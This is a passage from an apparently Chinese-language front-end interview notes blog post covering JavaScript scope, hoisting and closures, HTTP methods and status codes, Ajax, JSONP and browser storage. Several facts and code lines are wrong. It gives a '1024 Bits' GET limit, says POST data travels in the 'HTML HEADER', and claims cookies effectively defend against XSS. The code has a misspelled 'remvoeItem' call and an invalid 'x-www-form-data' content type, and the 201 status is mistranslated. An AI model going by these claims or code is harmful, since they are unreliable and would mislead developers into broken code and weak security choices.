的作用域在其最近的函数体内，<code>let</code> 的作用域在其最近的代码块内。</p><h4 id="两种不同的函数声明方式区别"><a href="#两种不同的函数声明方式区别" class="headerlink" title="两种不同的函数声明方式区别"></a>两种不同的函数声明方式区别</h4><p><strong>JavaScript</strong> 有两种函数声明方式，<code>var fn = function(){}</code> 和 <code>function fn(){}</code>，前者是运行时定义，后者是编译时定义。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">foo();    <span class="comment">// no error</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line"></div><div class="line">bar();    <span class="comment">// error: bar is not a function</span></div><div class="line"><span class="keyword">let</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div></pre></td></tr></table></figure><h4 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h4><p>在一个<code>var</code>作用域内非子作用域内声明一个变量，那么在该变量被声明之前的同名变量会初始化为 <code>undefiend</code>，此时外部作用域同名变量将不再作用于作用域内部同名变量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> foo = <span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(foo);    <span class="comment">// undefined</span></div><div class="line">    <span class="keyword">var</span> foo = <span class="number">2</span>;</div><div class="line">    foo++;</div><div class="line">&#125;</div><div class="line">fn1();</div><div class="line"><span class="built_in">console</span>.log(foo);    <span class="comment">// 1</span></div></pre></td></tr></table></figure><h4 id="GET-和-POST-区别"><a href="#GET-和-POST-区别" class="headerlink" title="GET 和 POST 区别"></a>GET 和 POST 区别</h4><ul><li>GET 用于从服务器取出数据</li><li>POST 用于改变服务器的数据</li><li>在客户端，GET 方式通过 URL 提交数据，数据在 URL 中可以看到；POST 方式，数据放在 HTML HEADER 内提交。</li><li>GET 提交数据最多为 1024 Bits，POST 则无限制</li></ul><h5 id="GET-的特性"><a href="#GET-的特性" class="headerlink" title="GET 的特性"></a>GET 的特性</h5><ul><li>GET 用于安全行为，POST 用于不安全行为</li><li>GET 请求可以被缓存</li><li>GET 请求会留在浏览器历史里</li><li>GET 可以作为书签保存</li><li>GET 链接可以分享</li><li>GET 可以用于 hack</li></ul><h5 id="用-POST-的情况"><a href="#用-POST-的情况" class="headerlink" title="用 POST 的情况"></a>用 POST 的情况</h5><ul><li>修改服务器数据</li><li>敏感信息</li><li>长数据，多数据</li></ul><h4 id="AngularJS-控制器间数据共享"><a href="#AngularJS-控制器间数据共享" class="headerlink" title="AngularJS 控制器间数据共享"></a>AngularJS 控制器间数据共享</h4><p>关键词：<code>$emit</code>, <code>$broadcast</code>, <code>$on</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">angular.module(<span class="string">'app'</span>, [])</div><div class="line">    .controller(<span class="string">'parentCtrl'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</div><div class="line">        <span class="comment">// 监听子控制器注册事件</span></div><div class="line">        $scope.$on(<span class="string">'CtrlNameChange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event, msg</span>) </span>&#123;</div><div class="line">            <span class="comment">// 广播给所有子控制器</span></div><div class="line">            $scope.$broadcast(<span class="string">'CtrlNameChangeBroadcastFromParent'</span>, msg)</div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line">    .controller(<span class="string">'ChildCtrl1'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</div><div class="line">        $scope.change = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">            <span class="comment">// 冒泡到父控制器</span></div><div class="line">            $scope.$emit(<span class="string">'CtrlNameChange'</span>, name);</div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line">    .controller(<span class="string">'ChildCtrl2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</div><div class="line">        <span class="comment">// 监听父控制器广播事件</span></div><div class="line">        $scope.$on(<span class="string">'CtrlNameChangeBroadcastFromParent'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event, msg</span>) </span>&#123;</div><div class="line">            $scope.ctrlName = msg;</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div></pre></td></tr></table></figure><h4 id="闭合函数"><a href="#闭合函数" class="headerlink" title="闭合函数"></a>闭合函数</h4><h5 id="什么是闭合函数"><a href="#什么是闭合函数" class="headerlink" title="什么是闭合函数"></a>什么是闭合函数</h5><ul><li>一个代表函数的变量(在函数结束之后仍可访问)或一个指向函数的指针</li><li>在函数结束之后其空间并未被释放而是被放在堆结构内提供访问需要</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> greet = <span class="string">'Hello world'</span>;</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(greet);</div><div class="line">    &#125;;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> bar = foo();</div><div class="line">bar();  <span class="comment">// "Hello world";</span></div></pre></td></tr></table></figure><p>以上 <code>foo</code> 函数包含了一个闭合，因为其内部定义了一个匿名函数 <code>function() { console.log(greet); }</code>，一旦你在一个函数内使用了 <code>function</code> 关键词，你就创造了一个闭合。</p><p>在闭合函数中，函数运行完毕后不会被立即释放内存，而是保留了其引用(reference)，这是其和 <code>C</code> 语言或其他类似语言不同的。</p><p>闭合函数只是引用，不是复制：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">var</span> inner =  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(a);</div><div class="line">    &#125;;</div><div class="line">    a++;</div><div class="line">    <span class="keyword">return</span> inner;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> bar = foo();</div><div class="line">bar();  <span class="comment">// 2;</span></div></pre></td></tr></table></figure><p>以下丧心病狂例子来自 <a href="http://stackoverflow.com/questions/111102/how-do-javascript-closures-work" target="_blank" rel="external">stackoverflow</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupSomeGlobals</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// Local variable that ends up within closure</span></div><div class="line">    <span class="keyword">var</span> num = <span class="number">666</span>;</div><div class="line">    <span class="comment">// Store some references to functions as global variables</span></div><div class="line">    gAlertNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(num); &#125;</div><div class="line">    gIncreaseNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; num++; &#125;</div><div class="line">    gSetNumber = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; num = x; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setupSomeGlobals();</div><div class="line">gIncreaseNumber();</div><div class="line">gAlertNumber(); <span class="comment">// 667</span></div><div class="line">gSetNumber(<span class="number">5</span>);</div><div class="line">gAlertNumber(); <span class="comment">// 5</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> oldAlert = gAlertNumber;</div><div class="line"></div><div class="line">setupSomeGlobals();</div><div class="line">gAlertNumber(); <span class="comment">// 666</span></div><div class="line"></div><div class="line">oldAlert() <span class="comment">// 5</span></div><div class="line"></div><div class="line"><span class="comment">/*********************************************************************************/</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildList</span>(<span class="params">list</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</div><div class="line">        <span class="keyword">var</span> item = <span class="string">'item'</span> + list[i];</div><div class="line">        result.push( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(item + <span class="string">' '</span> + list[i])&#125; );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">testList</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> fnlist = buildList([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</div><div class="line">    <span class="comment">// Using j only to help prevent confusion -- could use i.</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; fnlist.length; j++) &#123;</div><div class="line">        fnlist[j]();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">testList();    <span class="comment">// "item3 undefined" for 3 times</span></div><div class="line"><span class="comment">// because closure is a reference, when the loop in buildList() is complete, i has turned to 3, so list[3] is undefined.</span></div><div class="line"></div><div class="line"><span class="comment">/***************************************************************************/</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayAlice</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> sayAlert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(alice); &#125;</div><div class="line">    <span class="comment">// Local variable that ends up within closure</span></div><div class="line">    <span class="keyword">var</span> alice = <span class="string">'Hello Alice'</span>;</div><div class="line">    <span class="keyword">return</span> sayAlert;</div><div class="line">&#125;</div><div class="line">sayAlice()();</div><div class="line"></div><div class="line"><span class="comment">/*********************************************************************/</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">newClosure</span>(<span class="params">someNum, someRef</span>) </span>&#123;</div><div class="line">    <span class="comment">// Local variables that end up within closure</span></div><div class="line">    <span class="keyword">var</span> num = someNum;</div><div class="line">    <span class="keyword">var</span> anArray = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</div><div class="line">    <span class="keyword">var</span> ref = someRef;</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</div><div class="line">        num += x;</div><div class="line">        anArray.push(num);</div><div class="line">        alert(<span class="string">'num: '</span> + num +</div><div class="line">            <span class="string">'\nanArray '</span> + anArray.toString() +</div><div class="line">            <span class="string">'\nref.someVar '</span> + ref.someVar);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">obj = &#123;<span class="attr">someVar</span>: <span class="number">4</span>&#125;;</div><div class="line">fn1 = newClosure(<span class="number">4</span>, obj);</div><div class="line">fn2 = newClosure(<span class="number">5</span>, obj);</div><div class="line">fn1(<span class="number">1</span>); <span class="comment">// num: 5; anArray: 1,2,3,5; ref.someVar: 4;</span></div><div class="line">fn2(<span class="number">1</span>); <span class="comment">// num: 6; anArray: 1,2,3,6; ref.someVar: 4;</span></div><div class="line">obj.someVar++;</div><div class="line">fn1(<span class="number">2</span>); <span class="comment">// num: 7; anArray: 1,2,3,5,7; ref.someVar: 5;</span></div><div class="line">fn2(<span class="number">2</span>); <span class="comment">// num: 8; anArray: 1,2,3,6,8; ref.someVar: 5;</span></div></pre></td></tr></table></figure><h4 id="前端性能优化"><a href="#前端性能优化" class="headerlink" title="前端性能优化"></a>前端性能优化</h4><p>权威发布：<a href="https://developer.yahoo.com/performance/rules.html" target="_blank" rel="external">Best Practices for Speeding Up Your Web Site</a></p><p>来自：<a href="https://github.com/fouber/blog/issues/3#issuecomment-150230758" target="_blank" rel="external">前端工程与性能优化 – fouber</a></p><table><thead><tr><th>优化方向</th><th>优化手段</th></tr></thead><tbody><tr><td>请求数量</td><td>合并脚本和样式表，CSS Sprites，拆分初始化负载，划分主域，webpack</td></tr><tr><td>请求带宽</td><td>开启GZip，精简JavaScript，移除重复脚本，图像优化</td></tr><tr><td>缓存利用</td><td>使用CDN，使用外部JavaScript和CSS，添加Expires头，减少DNS查找，配置ETag，使AjaX可缓存</td></tr><tr><td>页面结构</td><td>将样式表放在顶部，将脚本放在底部，尽早刷新文档的输出</td></tr><tr><td>代码校验</td><td>避免CSS表达式，避免重定向</td></tr></tbody></table><p>什么是 CSS 表达式，比如这个：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span> &#123;</div><div class="line">    <span class="attribute">background-color</span>: <span class="built_in">expression</span>((new Date()).<span class="built_in">getHours</span>()%<span class="number">2</span> ? <span class="string">"#B8D4FF"</span> : <span class="string">"#F08A00"</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这种写法始于 IE5，终于 IE8，解释： <a href="http://blogs.msdn.com/b/ie/archive/2008/10/16/ending-expressions.aspx" target="_blank" rel="external">Ending Expressions</a>。</p><h4 id="取消一个-Ajax-请求"><a href="#取消一个-Ajax-请求" class="headerlink" title="取消一个 Ajax 请求"></a>取消一个 Ajax 请求</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xmlHttp;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</div><div class="line">    xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">    xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Msxml2.XMLHTTP'</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHttp'</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!xmlHttp) &#123;</div><div class="line">    <span class="built_in">console</span>.error(<span class="string">'Your browser don\'t support XMLHttp Object'</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line">xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (xmlHttp.readyState === <span class="number">4</span> &amp;&amp; xmlHttp.status === <span class="number">200</span>) &#123;</div><div class="line">        <span class="built_in">console</span>.log(xmlHttp.responseText/responseJSON/responseXML/response);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">console</span>.error(<span class="string">'error'</span>);</div><div class="line">    &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    <span class="built_in">console</span>.error(e.description);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">xmlHttp.open(<span class="string">'POST'</span>, url, <span class="literal">true</span>);</div><div class="line">xmlHttp.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-data'</span>);</div><div class="line">xmlHttp.send(<span class="string">'a=2&amp;b=1'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (xmlHttp.readyState === <span class="number">3</span>) xmlHttp.abort();</div></pre></td></tr></table></figure><h4 id="script-属性-async-defer-区别"><a href="#script-属性-async-defer-区别" class="headerlink" title="script 属性 async, defer 区别"></a>script 属性 async, defer 区别</h4><p><code>&lt;script&gt;&lt;/script&gt;;</code> 同步加载，在浏览器解析 DOM 之前加载，可能会堵塞线程</p><p><code>&lt;script async&gt;&lt;/script&gt;</code> 异步加载，在浏览器解析 DOM 的同时加载</p><p><code>&lt;script defer&gt;&lt;/script&gt;</code> 在浏览器解析 DOM 完成之后加载</p><h4 id="JSONP-跨域的原理"><a href="#JSONP-跨域的原理" class="headerlink" title="JSONP 跨域的原理"></a>JSONP 跨域的原理</h4><p>动态添加一个 <code>script</code> 标签，<code>sciprt</code> 内的 <code>scr</code> 属性是不受同源策略影响的，也就是说 JSONP 的方式和 <code>Ajax</code> 协议是没有关系的，这和 <code>&lt;image src&gt;</code> 是同样道理。</p><h4 id="Redux-最重要的几个概念"><a href="#Redux-最重要的几个概念" class="headerlink" title="Redux 最重要的几个概念"></a>Redux 最重要的几个概念</h4><p><a href="http://redux.js.org/docs/api/Store.html" target="_blank" rel="external">store</a>, <strong>state</strong>, <strong>dispatch</strong></p><h4 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h4><p>GET, POST, HEAD, PUT, DELETE, OPTIONS, TRACE, CONNECT</p><h4 id="HTTP-状态响应码"><a href="#HTTP-状态响应码" class="headerlink" title="HTTP 状态响应码"></a>HTTP 状态响应码</h4><h5 id="1-Information-请求收到，继续处理"><a href="#1-Information-请求收到，继续处理" class="headerlink" title="1** Information 请求收到，继续处理"></a>1** Information 请求收到，继续处理</h5><ul><li>100 Continue 客户必须继续发出请求*   101 Switch Protocols 客户要求服务器根据请求转换 HTTP 协议版本 <!--more--></li></ul><h5 id="2-Successful-操作成功收到，分析、接受"><a href="#2-Successful-操作成功收到，分析、接受" class="headerlink" title="2** Successful 操作成功收到，分析、接受"></a>2** Successful 操作成功收到，分析、接受</h5><ul><li>200 OK 请求成功</li><li>201 Created 提示知道新闻界的 URL</li><li>202 Accepted 接受处理，但处理未完成</li><li>203 Non-Authoritative Information 返回信息不确定或不完整</li><li>204 No Content 请求收到，但返回信息为空</li><li>205 Reset Content 服务器完成了请求，用户代理必须复位当前已经浏览过的文件</li><li>206 Partial Content 服务器已经完成了部分用户的 GET 请求</li></ul><h5 id="3-Redirection-重定向"><a href="#3-Redirection-重定向" class="headerlink" title="3** Redirection 重定向"></a>3** Redirection 重定向</h5><ul><li>300 Multiple Choices 请求的资源可在多处得到</li><li>301 Moved Permanently 永久跳转</li><li>302 Found 在其他地址发现了请求数据</li><li>303 See Other 建议客户访问其他 URL 或访问方式</li><li>304 Not Modified 客户端意见执行了 GET，但文件未变化</li><li>305 Use Proxy 请求的资源必须从服务器指定的地址得到</li><li>306 Unused 前一版本 HTTP 中使用的代码，现行版本中不再使用</li><li>307 Temporary Redirect 申明请求的资源临时性删除</li></ul><h5 id="4-Client-Error"><a href="#4-Client-Error" class="headerlink" title="4** Client Error"></a>4** Client Error</h5><ul><li>400 Bad Request 错误请求，如语法错误</li><li>401 Unauthorized 未授权</li><li>402 Payment Required 域名保留为未来使用</li><li>403 Forbidden 禁止访问</li><li>404 Not Found 找不到文件、查询或 URL</li><li>405 Method Not Allowed 当前 HTTP 请求方法不被允许</li><li>406 Not Acceptable 根据用户发送的 Accept，请求资源不可访问 …</li></ul><h5 id="5-Server-Error"><a href="#5-Server-Error" class="headerlink" title="5** Server Error"></a>5** Server Error</h5><ul><li>500 Internal Server Error 内部服务器错误</li><li>501 Not Implemented 服务器不支持需要用来完成请求的函数</li><li>502 Bad Gateway 网关错误</li><li>503 Service Unavailable 服务器维护中或过载</li><li>504 Gateway Timeout 网关超时</li><li>505 Http Version Not Supported 不支持的 HTTP 版本</li></ul><h5 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h5><ul><li><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="external">http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a></li><li><a href="http://nonfu.me/p/6888.html" target="_blank" rel="external">http://nonfu.me/p/6888.html</a></li></ul><h4 id="cookie-localStorage-和-sessionStorage-的异同"><a href="#cookie-localStorage-和-sessionStorage-的异同" class="headerlink" title="cookie, localStorage 和 sessionStorage 的异同"></a>cookie, localStorage 和 sessionStorage 的异同</h4><h5 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h5><ul><li>都属于客户端或浏览器存储机制</li><li>都具有同源安全策略</li></ul><h5 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h5><p>localStorage 和 sessionStorage 是 HTML5 的新 APIs，意味着不是所有浏览器都支持，现代浏览器基本都支持。</p><p>sessionStorage 存储的信息会在浏览器关闭后清除，但页面关闭而浏览器不关闭则不会被清除，顾名思义，其只存活在一个浏览器会话中。 如果你希望保存的信息在浏览器关闭重开后还能使用，则应该用 localStorage。</p><p>localStorage 和 sessionStorage 应该用来保存非敏感并且需要在同源页面间使用的信息，两者都能被客户端或浏览器轻易读取和改变，所以不应该依赖这两者保存敏感或安全信息。</p><p>查看浏览器是否支持 localStorage 和 sessionStorage：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.localStorage != <span class="literal">undefined</span>;</div><div class="line"><span class="built_in">window</span>.sessionStorage != <span class="literal">undefined</span></div><div class="line"></div><div class="line">localStorage 和 sessionStorage 基本操作：</div><div class="line"></div><div class="line">localStorage.setItem(<span class="string">'foo'</span>, <span class="string">'bar'</span>);</div><div class="line">localStorage[<span class="string">'foo'</span>] = <span class="string">'bar'</span>;</div><div class="line">localStorage.foo = <span class="string">'bar'</span></div><div class="line">localStorage.getItem(<span class="string">'foo'</span>);    <span class="comment">// bar</span></div><div class="line">localStorage.remvoeItem(<span class="string">'foo'</span>);</div><div class="line">localStorage.clear();</div><div class="line"></div><div class="line">sessionStorage.setItem(<span class="string">'foo'</span>, <span class="string">'bar'</span>);</div><div class="line">sessionStorage[<span class="string">'foo'</span>] = <span class="string">'bar'</span>;</div><div class="line">sessionStorage.foo = <span class="string">'bar'</span>;</div><div class="line">sessionStorage.getItem(<span class="string">'foo'</span>);  <span class="comment">// bar</span></div><div class="line">sessionStorage.remvoeItem(<span class="string">'foo'</span>);</div><div class="line">sessionStorage.clear();</div></pre></td></tr></table></figure><p>关系到敏感信息则应该用 cookie，因为cookie 相对较难被用户读取和写入，但如果用非 SSL 传输，cookie 同样可能在传输过程中被截取，尤其是在用一个公共 wifi。</p><p>cookie 安全等级比前两者高，它可以有效防御 XSS(Cross-Site Scripting)。因此可以使用 cookie 来存储一些验证信息，比如登陆 token或广告商的用户追踪。</p><p>cookie 大多被用来验证用户数据，在同源内，页面本身 HTTP 请求包括其内部的 Ajax 请求、图片、样式、脚本和字体的 HTTP 头都包含 cookie，因为不应该用 cookie 存储大量数据，事实上浏览器会对过长 cookie 进行截取的。</p><p>cookie 本身是一段字符串，sessionStorage 和 localStorage 则是以 JavaScript primitives(JSON serialise) 形式保存，可读性很高。</p><p>提取 cookie 作为对象返回：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</div><div class="line">    <span class="keyword">var</span> cookieObj = &#123;&#125;;</div><div class="line">    cookieArr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">v, k</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> firstEqualSign = v.indexOf(<span class="string">'='</span>);</div><div class="line">        <span class="keyword">var</span> cookieKey = v.slice(<span class="number">0</span>, firstEqualSign);</div><div class="line">        <span class="keyword">var</span> cookieVal = v.slice(firstEqualSign + <span class="number">1</span>);</div><div class="line">        cookieObj[cookieKey] = cookieVal;</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> cookieObj;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h5><ul><li><a href="http://stackoverflow.com/questions/19867599/what-is-the-difference-between-localstorage-sessionstorage-session-and-cookies" target="_blank" rel="external">What is the difference between localStorage, sessionStorage, session and cookies?</a></li><li><a href="http://diveintohtml5.info/storage.html" target="_blank" rel="external">THE PAST, PRESENT &amp; FUTURE OF LOCAL STORAGE FOR WEB APPLICATIONS</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API" target="_blank" rel="external">Using the Web Storage API</a></li></ul><h4 id="总参考"><a href="#总参考" class="headerlink" title="总参考"></a>总参考</h4><ul><li><a href="http://www.cnblogs.com/whitewolf/archive/2013/04/16/3024843.html" target="_blank" rel="external">http://www.cnblogs.com/whitewolf/archive/2013/04/16/3024843.html</a></li><li><a href="http://stackoverflow.com/questions/111102/how-do-javascript-closures-work" target="_blank" rel="external">http://stackoverflow.com/questions/111102/how-do-javascript-closures-work</a></li><li><a href="http://www.sitepoint.com/key-differences-post/" target="_blank" rel="external">http://www.sitepoint.com/key-differences-post/</a></li><li><a href="http://stackoverflow.com/questions/4775722/check-if-object-is-array" target="_blank" rel="external">http://stackoverflow.com/questions/4775722/check-if-object-is-array</a></li><li><a href="http://stackoverflow.com/questions/6490252/vertically-centering-a-div-inside-another-div" target="_blank" rel="external">http://stackoverflow.com/questions/6490252/vertically-centering-a-div-inside-another-div</a></li><li><a href="http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript" target="_blank" rel="external">http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript</a></li></ul>]]></content>
    
    <summary type="html">
    
